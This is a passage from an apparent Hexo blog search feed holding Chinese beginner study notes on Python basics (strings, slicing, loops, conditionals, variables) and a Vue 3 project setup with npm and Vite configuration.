src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701874801740-f94558b8-eeac-491c-9092-a8c56a31ee7c.png" alt="image.png"><br>not in判断是否不存在该字符串<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701874678697-72e1c995-ad21-4565-8043-dc0ee8d97219.png" alt="image.png"><br>startwith判断字符串以xxx开头，endswith判断字符串以xxx结尾<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701875484046-8be76a80-904c-431c-a50a-6e4238a987c5.png" alt="image.png"><br>isdigit判断字符串是否有整数组成<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701876104742-5b33c4a3-660b-45d8-9c64-40b72610d3c3.png" alt="image.png"><br>isdecimal判断字符串是否有小数组成.以下图为例，不能用money&#x3D;&#x3D;money.isdecimal(),因为isdecimal是去判断输入的数字是否只含十进制数字的字符。例如12345将会输出true，输入12.4时就会出现false。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701946305846-bab40cb4-7cfc-4cb9-b882-dcf146006a6e.png" alt="image.png"><br>最后的笔记：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701876546371-3b57533f-9d3b-4439-b4be-6df884faa958.png" alt="image.png"></p><h2 id="四-补充和总结"><a href="#四-补充和总结" class="headerlink" title="四.补充和总结"></a>四.补充和总结</h2><p>len和print,type,input一样是内置函数，不需要s&#x3D;xxxx,可以直接使用<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701959109082-036a5fea-1a2d-41f6-bc06-68715f2bd43a.png" alt="image.png"><br>join是一个跟split相反的一个东西，split是进行切割，join进行连接,下图将这些字符串用”_”进行连接。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701959500354-b8ad985b-83c1-4642-aae4-dcb6ea70850d.png" alt="image.png"></p><p>总结：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>f(&#123;变量&#125;)  格式化一个字符串</span><br><span class="line"><span class="number">2.</span>索引和切片：</span><br><span class="line">索引：从<span class="number">0</span>开始的,[]</span><br><span class="line">切片：s[start:end:step] end位置的数据永远拿不到</span><br><span class="line"><span class="number">3.</span>相关操作：</span><br><span class="line">字符串操作是对源字符串不发生改变的</span><br><span class="line"><span class="number">1.</span>upper() 在忽略大小写的时候</span><br><span class="line"><span class="number">2.</span>strip()  可以去掉字符串左右两端的空白(空格，\n,\t)</span><br><span class="line"><span class="number">3.</span>replace() 字符串的替换</span><br><span class="line"><span class="number">4.</span>split()  对字符串进行切割</span><br><span class="line"><span class="number">5.j</span>oin()  拼接一个列表中的内容形成一个新的字符串</span><br><span class="line"><span class="number">6.</span>startswith() 判断字符串是否以xxx开头</span><br><span class="line"><span class="number">7.</span><span class="built_in">len</span>()      字符串的长度(内置函数)</span><br><span class="line"></span><br><span class="line">字符产的循环和遍历</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(c) 此时输出的是字符串中一个个字符</span><br><span class="line">关于 <span class="keyword">in</span>:</span><br><span class="line"><span class="number">1.</span><span class="keyword">for</span>循环里面</span><br><span class="line"><span class="number">2.</span>判断xxx是否在xxx里面</span><br></pre></td></tr></table></figure><p>总结截图如下：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702031702133-eeae7358-ae26-486b-b0d2-d9bcee942a75.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>索引和切片</title>
      <link href="/2023/12/10/%E7%B4%A2%E5%BC%95%E5%92%8C%E5%88%87%E7%89%87/"/>
      <url>/2023/12/10/%E7%B4%A2%E5%BC%95%E5%92%8C%E5%88%87%E7%89%87/</url>
      
        <content type="html"><![CDATA[<p>索引：按照位置提取元素<br>可以采用索引的方式提取某一个字符(文字)<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701609640590-24b742e5-79e7-4818-ac8d-44a9f3f9d7d5.png" alt="image.png"><br>按常理来说第3个字符应该是周，但是程序员都是从0开始数的，所以是润<br>       负号表示倒数，s[-1]所显示的是发<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701609858951-1a4e93c0-10f5-4c3b-ab57-6dd0c7836a54.png" alt="image.png"></p><p>切片：从一个字符串中提取一部分内容<br>语法：s[start:end]<br>解释：从start开始切片到end结束，但取不到end，[start,end)<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701610704819-e35bcde4-ae3a-4535-9af6-553221ac32cf.png" alt="image.png"><br>如果start是从开头开始切片，可以省略<br>从start开头一直到结尾，结尾可以省略<br>：如果左右两边有空白，表示空白或者结尾<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701611226432-4f5f9d97-1cd0-461c-9488-a5d0e9c979aa.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701611265002-25b6d67b-b7da-4ed8-840b-d6c71db12ab3.png" alt="image.png"><br>当切片的数字选择为负数时也还是从左到右进行切片<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701611383630-eb7a8292-4144-4926-a337-bc1b1aad36ea.png" alt="image.png"><br>从-1到-3进行切片显示没有结果<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701611554606-f7e9cd80-d236-411e-9a58-9862ee1aff1e.png" alt="image.png"><br>可以给切片添加步长，来改变切片的方向<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701611936418-123e1195-ced5-4014-92c0-a461be44b915.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701612342164-99ace6e3-602e-4fad-8740-965781b92197.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701612587982-1af0aa8e-fbfd-4737-b746-b1552f6ae9b4.png" alt="image.png"></p><p>最后的笔记：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701612764650-f537da30-6936-4ee4-8690-75c2d77dba4d.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pass关键字</title>
      <link href="/2023/12/10/pass%E5%85%B3%E9%94%AE%E5%AD%97/"/>
      <url>/2023/12/10/pass%E5%85%B3%E9%94%AE%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<p>代码占用，没有想好的条件下可以用pass<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701608679852-38d54dca-4cf0-451e-8161-53bc8eacedb0.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>for循环</title>
      <link href="/2023/12/10/for%E5%BE%AA%E7%8E%AF/"/>
      <url>/2023/12/10/for%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>循环是可以迭代的</span><br><span class="line"><span class="keyword">for</span> 变量 <span class="keyword">in</span> 可迭代的东西：</span><br><span class="line">    代码</span><br><span class="line">解释：把可迭代的东西中的每一项内容拿出来，挨个的赋值给变量，每一次赋值都要执行一次循环体(代码)</span><br></pre></td></tr></table></figure><p>for循环是可以迭代的<br>for 变量 in 可迭代的东西：<br>    代码<br>解释：把可迭代的东西中的每一项内容拿出来，挨个的赋值给变量，每一次赋值都要执行一次循环体(代码)</p><p>可以把每个字符串打印出来：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701607226953-507ddc0d-3a0e-48ed-9d11-8ff74b93d47c.png" alt="image.png"></p><p>for循环想要计数，必须借助于range<br>range(n):从0数到n，不包括n<br>range(m,n):从m数到n，依然不包括n<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701607706904-e2aaa39c-4e4a-4b4b-88dc-a5339aa3029f.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701607669169-a0b103b4-0abb-4dbb-a1e6-7820625d8b7c.png" alt="image.png"><br>range(m,n,q):从m数到n，依然不包括n,每次的间隔为q，示例如下：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701608079399-807e2ef1-cc42-4e86-b8e8-7ec695e4ba87.png" alt="image.png"></p><p>最后的笔记为：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701608397232-2ac00fcc-01b5-4c5a-a199-5848d9cddd13.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>循环语句，跳出循环</title>
      <link href="/2023/12/10/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%EF%BC%8C%E8%B7%B3%E5%87%BA%E5%BE%AA%E7%8E%AF/"/>
      <url>/2023/12/10/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%EF%BC%8C%E8%B7%B3%E5%87%BA%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 条件：</span><br><span class="line">代码</span><br><span class="line">解释：判断条件是否为真，真就执行代码，然后再次判定条件，...直至条件为假，循环结束</span><br></pre></td></tr></table></figure><p>示例：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701601117272-277d5d28-7e35-4257-abee-db3908f5dc7d.png" alt="image.png"><br>创建一个从1数到100的程序<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701602696904-bb318aee-87e1-4920-a01c-661604918687.png" alt="image.png"></p><p>创建一个从1加到100的程序<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701603616176-c51f0292-c81c-470e-b95d-b1c49e980518.png" alt="image.png"><br>可以一直说：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701604766794-727896ec-342b-4da1-ad78-34db25a6e7c9.png" alt="image.png"></p><h2 id="break："><a href="#break：" class="headerlink" title="break："></a>break：</h2><p>让当前循环停止<br>设置一个if语句跳出当前循环，当前的break只是结束循环，而不是结束整个程序<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701605062895-d904ce41-e5a5-4298-8573-4e5b4b4807e8.png" alt="image.png"></p><h2 id="continue："><a href="#continue：" class="headerlink" title="continue："></a>continue：</h2><p>停止此次循环，执行下一次循环<br>本张图片显示的是从1数到10，通过continue去掉了4的结果<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701605818863-067110e3-6e7c-4657-9d4f-50016392cb5c.png" alt="image.png"><br>当前程序用break就会直接跳出循环：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701606086398-4b30fc61-790e-4079-8800-fe77ef9fcb29.png" alt="image.png"></p><h2 id="最后的笔记："><a href="#最后的笔记：" class="headerlink" title="最后的笔记："></a>最后的笔记：</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701606160234-b45b7586-5287-4f06-88e4-97dfeca4a471.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python条件判断</title>
      <link href="/2023/12/10/python%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD/"/>
      <url>/2023/12/10/python%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<p>条件判断：</p><h2 id="第一种语法："><a href="#第一种语法：" class="headerlink" title="第一种语法："></a>第一种语法：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>  条件 :</span><br><span class="line">     代码</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701593233679-e9630050-9a25-45e5-86a0-577aa91d8511.png" alt="image.png"></p><p>python里面没有大括号，前面空出的空格就是包含关系，条件判断为ture，结果如图所示，不管如何都会执行回家<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701593835157-9f9f0514-cb65-430c-9789-6049b06385e9.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701593908224-29d2095e-2819-4ab2-9bbc-1fc67a819ee6.png" alt="image.png"><br>if条件示意图：</p><h2 id="第二种语法："><a href="#第二种语法：" class="headerlink" title="第二种语法："></a><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701594005042-23f9d1b4-64bf-4a4a-affb-2c95a7cad7ac.png" alt="image.png">第二种语法：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>   条件：</span><br><span class="line">         代码<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">        代码<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701595433208-6a6754cd-cc91-42df-9f94-46cbc62db54d.png" alt="image.png"><br>示例：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701594815430-bd01a8b8-11d7-43b3-a1c8-7907184f5f3b.png" alt="image.png"><br>报错的原因是因为&gt;号两端的数据类型不一致，因为money是字符串类型，而3000是整数类型<br>输入：money&#x3D;int((money))，即可进行转换并且成功运行。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701595118369-da025cc0-6e2a-4a55-9e75-b685dbdefa43.png" alt="image.png"><br>第二种语法的示意图：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701595198841-f17bf7a3-c294-4d0f-9f90-e08e94d2cc35.png" alt="image.png"></p><h2 id="第三种语法："><a href="#第三种语法：" class="headerlink" title="第三种语法："></a>第三种语法：</h2><p>if可以进行嵌套</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件：</span><br><span class="line">     <span class="keyword">if</span>  条件：</span><br><span class="line">         代码<span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span>：</span><br><span class="line">         代码<span class="number">2</span></span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">代码<span class="number">3</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701598543731-81a548af-4827-414e-92b8-449175124c25.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701598212101-e130905a-be6b-4ca8-bfbd-aee02393721d.png" alt="image.png"></p><h2 id="第四种语法："><a href="#第四种语法：" class="headerlink" title="第四种语法："></a>第四种语法：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>：</span><br><span class="line">代码<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">2</span>：</span><br><span class="line">代码<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">3</span>：</span><br><span class="line">代码<span class="number">3</span></span><br><span class="line">....</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">代码<span class="number">4</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701600259596-a409255d-0418-4c99-9781-71c9cb52c169.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701599583507-5c52320d-3655-41a5-acf0-cd6d8573f256.png" alt="image.png"><br>单纯使用else或者elif会报错：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701600093087-aa3d00d0-6565-4d71-946c-e992150e6f11.png" alt="image.png"></p><h2 id="最后的笔记："><a href="#最后的笔记：" class="headerlink" title="最后的笔记："></a>最后的笔记：</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701600388053-0898a230-b828-4810-9b2d-e67652aee89a.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python初始基础数据类型</title>
      <link href="/2023/12/10/python%E5%88%9D%E5%A7%8B%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2023/12/10/python%E5%88%9D%E5%A7%8B%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>基本的数据类型，这里只讲三个<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701590166050-1f10598d-b461-4330-a2f5-d2ba41953fbd.png" alt="image.png"><br>a和b都是同一个数据类型，才能进行运算：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701590208960-3bd2806b-8ea3-438a-b429-e1a19cd40218.png" alt="image.png"><br>小数比较简单<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701590461221-9a21a55e-37be-4091-a373-5acd015ab2de.png" alt="image.png"><br>这里不是很懂，为什么不会出现准确的数字？<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701590687844-c7d32db3-e301-471e-a160-bb4c11c5a8ee.png" alt="image.png"></p><p>字符串是重点，要用单引号或者双引号，三单引号，三双引号引起来，这四种情况都不会报错。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701591143361-1d7f255e-912f-43a7-945d-5de7d64504a0.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701591175974-117fdc16-96d8-4144-9303-b07ce047dd16.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701591539494-addefaca-1df1-4f6c-b4ea-1b7eabd377fe.png" alt="image.png"><br>文字可以做加法，两端必须是字符串<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701591833567-eeeb019e-29ea-4f70-9a91-978fca75e962.png" alt="image.png"><br>如果一端是数字就会报错<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701592019531-92b23d57-5655-498c-a53a-02cc4b07e850.png" alt="image.png"><br>字符串可以做乘法，表示字符串重复的次数<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701592211764-fad72ebc-4f64-445c-9931-f5ebd15fc3fb.png" alt="image.png"><br>布尔类型：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701592538017-7779ad52-1a86-4378-ac46-454d772e2bc7.png" alt="image.png"><br>举例：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701593046080-af9dd5e5-8f3d-4029-bfa5-f5a57b46cc21.png" alt="image.png"></p><p>最后笔记结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701593089744-22841433-bc6f-4d08-9630-84e5572e1263.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python变量</title>
      <link href="/2023/12/10/python%E5%8F%98%E9%87%8F/"/>
      <url>/2023/12/10/python%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<p>打印一篇文章简单，但是一篇文章内容太大咋办，这就需要变量，打开pycharm输入print()<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701584853329-902ffdca-613c-4828-b65a-b8a286e09206.png" alt="image.png"><br>一篇篇打印太麻烦，此时可以运用变量进行打印<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701585235157-5634b6ed-3d1b-4653-bf97-79da785b1580.png" alt="image.png"><br>结果如下：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701585251765-23698f2d-2646-4f22-bfde-879b1e818907.png" alt="image.png"></p><p>a原先为188，后面变为166，但是打印的时候都会显示：</p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701585900274-d9789614-1ba4-41eb-b563-f7dd5c637118.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701585749640-33f9502d-9b1b-43a5-a8d6-63c8080baa93.png" alt="image.png"><br>单纯按照规范输入也不会报错<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701586818905-bc0e523d-10e3-40d7-a5ce-8c2e2972adde.png" alt="image.png"></p><h2 id="python的书写规范："><a href="#python的书写规范：" class="headerlink" title="python的书写规范："></a>python的书写规范：</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701588613806-4b8b66b6-c9c4-4078-a4c7-5178c8d215d5.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701587448714-68beb262-eed1-4fcd-b387-4a4a275575cf.png" alt="image.png"><br>按照上述输入，没有问题，但是按照规范还是不建议</p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701588656320-f2a7ebdb-fa93-4b12-aa1e-579ca26a2b21.png" alt="image.png"><br>关键字，在创建变量时不能使用，上图最后两个是可以使用的，不过第一个更直观。<br>一个很严重的问题，引号有无的区别，第一个打印的时name的值，第二个打印的是name<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701589056852-e48ee588-c51d-44c2-a550-0c6d47acae5e.png" alt="image.png"></p><h2 id="最后的笔记："><a href="#最后的笔记：" class="headerlink" title="最后的笔记："></a>最后的笔记：</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701598267818-c43d912b-e1cb-4832-950b-03cd4f4a38f5.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python使用,注释,用户交互</title>
      <link href="/2023/12/10/python%E4%BD%BF%E7%94%A8-%E6%B3%A8%E9%87%8A-%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92/"/>
      <url>/2023/12/10/python%E4%BD%BF%E7%94%A8-%E6%B3%A8%E9%87%8A-%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92/</url>
      
        <content type="html"><![CDATA[<p>cmd输入python，显示python的版本号等相关信息<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701522570026-a6a24341-ba48-410f-802b-95e2d88e6b07.png" alt="image.png"><br>新建一个txt文件夹，在显示文件扩展名的前提下重命名为first.py，输入以下内容，有*记得保存。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701523266708-e37f9750-61ad-453b-863d-76cd9c8ff056.png" alt="image.png"><br>进入python后exit（）退出python的cmd命令行。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701527581709-e01b794e-0f88-4f5b-8e70-bff83f26cc57.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701528643510-9cebd023-958c-4cfd-bdae-1c3883fa3a11.png" alt="image.png"></p><h2 id="注释的重要性："><a href="#注释的重要性：" class="headerlink" title="注释的重要性："></a>注释的重要性：</h2><p>#对一行进行单行注释。选中所要添加注释的内容，ctrl+&#x2F;一次添加单行注释<br>多行一次添加注释：用鼠标选中需要注释的代码，三次按下： shift+&#x2F;<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701530432037-d50d3220-d2c4-4689-b681-1dc272f8cd38.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701531622570-04fcd821-4ec9-417d-a345-9fa15f5efd34.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>*不用保存，pycharm自动保存。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701531829510-004003a6-506e-4ea1-b53e-724e0f78e6a2.png" alt="image.png"><br>不存在绝对意义上的常量，定义之后输出就行。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701568613632-73e615ca-fc7b-436c-a5d6-a000cf31d552.png" alt="image.png"><br>运行一个计算器，不是简单的定义加输出就行<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701569688507-e3691e52-9984-4422-9c89-1db4da029b27.png" alt="image.png"><br>因为是单纯的a，类型为str字符串类型，输入之后是直接连接<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701571831733-f8a4c779-0012-4c18-b4b0-9412e0abe05e.png" alt="image.png"><br>通过输入type（），查看输入数字的类型<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701573236633-6bb0ee06-7f34-4976-90ec-4bd4c7d91e7e.png" alt="image.png"><br>上述代码结果为：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701573286620-328c2bab-36da-4daa-84d5-94e70a74eb9a.png" alt="image.png"><br>发现一个问题，当输入数字时产生报错，后续会解决。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701573829328-a5a1973c-6769-4919-8fdc-6ab6778d70bb.png" alt="image.png"></p><h2 id="最后的笔记："><a href="#最后的笔记：" class="headerlink" title="最后的笔记："></a>最后的笔记：</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701598341716-430e4590-f3ec-43b6-83eb-8aaa379310c3.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701598419081-80645bc4-c928-4376-bd28-f28d070e2457.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习vue3</title>
      <link href="/2023/12/08/%E5%AD%A6%E4%B9%A0vue3/"/>
      <url>/2023/12/08/%E5%AD%A6%E4%B9%A0vue3/</url>
      
        <content type="html"><![CDATA[<p>上午：</p><h2 id="介绍并学习了vue3"><a href="#介绍并学习了vue3" class="headerlink" title="介绍并学习了vue3"></a>介绍并学习了vue3</h2><p>​         Vue 3 是一种流行的 JavaScript 前端框架，用于构建交互式的用户界面和单页面应用程序（SPA）。它可用于去做小程序，也可以让Vue去做前端，通过API接口连接后台网站，通过后台对Vue进行管理。Vue.js 3 可以与多种语言和技术进行组合，实现各种类型的应用程序。<br> 安装Vue，用Vscode进行安装具体操作如下：</p><p>新建一个文件夹命名为vue，将其直接拖入Vscode，之后点击查看打开终端，输入：<br>npm init vue@latest<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702025430385-f968c173-9123-4c7d-9a21-e91577420f9a.png" alt="352bf9b8c515a65c771ffc456397f51.png"><br>一直点否就行，之后可以给创建的项目改名字，不改默认为vue-project。<br>接着输入提示的命令：<br>cd vue-project:切换为vue-project目录<br> npm install</p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231208173457082.png" alt="image-20231208173457082"></p><p>npm run dev<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702025651690-20c7bd51-cfac-4ba6-8d85-f4ddf6146bd2.png" alt="98e184318bc2ad915ffdd82c115d66b.png"><br>部署完成之后出现如下结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702025749986-787bcfd6-fd8c-4ba3-a52a-bda87f1fe786.png" alt="af6029d647c303297a5485222f27f3c.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702025718575-a7f43643-e444-4fee-8c5c-1a86ea0cf990.png" alt="ef4640bdafa089d85e68ae8a794f514.png"></p><p>打开src，找到APP.vue,对template内容进行修改，template专门放html代码的，切记将前面的一些内容注释掉，否则会影响测试结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702025904921-6cf6bd0e-a50f-4c96-b710-b03b382d6a79.png" alt="4cf2291027a4db53c055b9f15dc0c0a.png"><br>测试完成之后，还需要在终端安装element-plus的组件：<br>npm install element-plus –save </p><p>npm install -D unplugin-vue-components unplugin-auto-import</p><p>这两步必须要去完成否则就会报错。</p><p>等待安装完成就可以了，接着对main.js进行修改</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">import &#x27;./assets/main.css&#x27;</span><br><span class="line"></span><br><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;</span><br><span class="line">import App from &#x27;./App.vue&#x27;</span><br><span class="line">import ElementPlus from &#x27;element-plus&#x27;;</span><br><span class="line">import &#x27;element-plus/dist/index.css&#x27;</span><br><span class="line"></span><br><span class="line">createApp(App).mount(&#x27;#app&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着对vite.config.js进行修改：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">import &#123; fileURLToPath, URL &#125; from &#x27;node:url&#x27;</span><br><span class="line"></span><br><span class="line">import &#123; defineConfig &#125; from &#x27;vite&#x27;</span><br><span class="line">import vue from &#x27;@vitejs/plugin-vue&#x27;</span><br><span class="line">import AutoImport from &#x27;unplugin-auto-import/vite&#x27;</span><br><span class="line">import Components from &#x27;unplugin-vue-components/vite&#x27;</span><br><span class="line">import &#123; ElementPlusResolver &#125; from &#x27;unplugin-vue-components/resolvers&#x27;</span><br><span class="line"></span><br><span class="line">// https://vitejs.dev/config/</span><br><span class="line">export default defineConfig(&#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    vue(),</span><br><span class="line">    // ...</span><br><span class="line">    AutoImport(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span 